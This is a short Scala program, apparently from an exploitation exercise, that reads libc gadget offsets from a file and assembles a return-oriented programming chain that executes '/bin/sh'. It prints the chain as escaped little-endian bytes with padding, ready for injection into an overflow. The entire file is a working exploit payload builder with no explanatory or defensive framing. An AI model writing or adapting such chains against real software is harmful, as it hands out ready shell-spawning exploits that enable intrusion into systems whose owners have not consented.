package ROP
import scala.io.Source

object GadgetChainBuilder {

  def main(args: Array[String]): Unit = {
    val filename: String = args(0)

    val addresses = new Array[Long](8)
    val chain = new Array[Long](16)

    var i: Int = 0
    for (line <- Source.fromFile(filename).getLines) {
      addresses(i) = java.lang.Long.parseLong(line.toUpperCase, 16)
      i += 1;
    }

    val chainStart = addresses(0)
    val libcTextStart = addresses(1)

    chain(0) = libcTextStart + addresses(2)       // 0
    chain(1) = libcTextStart + addresses(3)       // 4
    chain(2) = java.lang.Long.parseLong("0b0b0b0b", 16)
    chain(3) = chainStart + 28  // 12
    chain(4) = libcTextStart + addresses(4)       // 16
    chain(5) = libcTextStart + addresses(5)       // 20
    chain(6) = libcTextStart + addresses(6)       // 24
    chain(7) = chainStart + 56  // 28
    chain(8) = libcTextStart + addresses(3)       // 32
    chain(9) = chainStart + 48  // 36
    chain(10) = chainStart + 52 // 40
    chain(11) = libcTextStart + addresses(7)      // 44
    chain(12) = chainStart + 56 // 48
    chain(13) = chainStart + 63 // 52 Points at 0 in /sh/0
    chain(14) = java.lang.Long.parseLong("6e69622f", 16)          // 56 "/bin"
    chain(15) = java.lang.Long.parseLong("68732f", 16)          // 60 "/sh/0"

    for (i <- 0 until 8)
      print(s"\\x42")

    for (gadget <- chain) {
      val hex = String.format("%08x", gadget)

      for (i <- hex.length - 1 to 0 by -2)
        print(s"\\x${hex(i - 1)}${hex(i)}")
    }
  }
}
